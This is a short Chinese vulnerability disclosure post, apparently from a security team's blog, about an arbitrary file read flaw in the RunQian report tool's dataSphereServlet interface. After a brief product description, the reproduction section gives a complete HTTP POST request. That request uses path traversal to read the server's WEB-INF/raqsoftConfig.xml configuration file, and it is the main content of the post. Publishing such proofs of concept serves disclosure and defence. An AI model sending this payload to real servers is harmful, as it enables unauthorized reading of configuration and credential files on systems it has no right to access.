#  润乾报表dataSphereServlet接口存在任意文件读取漏洞   
原创 R0seK1ller  蟹堡安全团队   2024-08-04 20:27  
  
# 1. 漏洞描述  
  
	  
    润乾报表是一个纯JAVA的企业级报表工具，支持对J2EE系统的嵌入式部署，无缝集成。服务器端支持各种常见的操作系统，支持各种常见的关系数据库和各类J2 EE的应用服务器，客户端采用标准纯html方式展现，支持ie和netscape， 润乾报表是领先的企业级报表分析软件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqk29AkQPbtib10CGiaUek83SkSAPVIfMFoibnqJSy0VVfehveEet6Kdm96g/640?wx_fmt=png&from=appmsg "")  
## 2. 漏洞复现  
```
POST /servlet/dataSphereServlet?action=11 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.31.133:6868/demo/
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 54

path=../../../WEB-INF/raqsoftConfig.xml&content=&mode=

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqkL9hkXJzxmKtnRIicDW7ahoj6KbVRwgEMdv4IaoqcX1w2tVPvUFXyUNA/640?wx_fmt=png&from=appmsg "")  
  
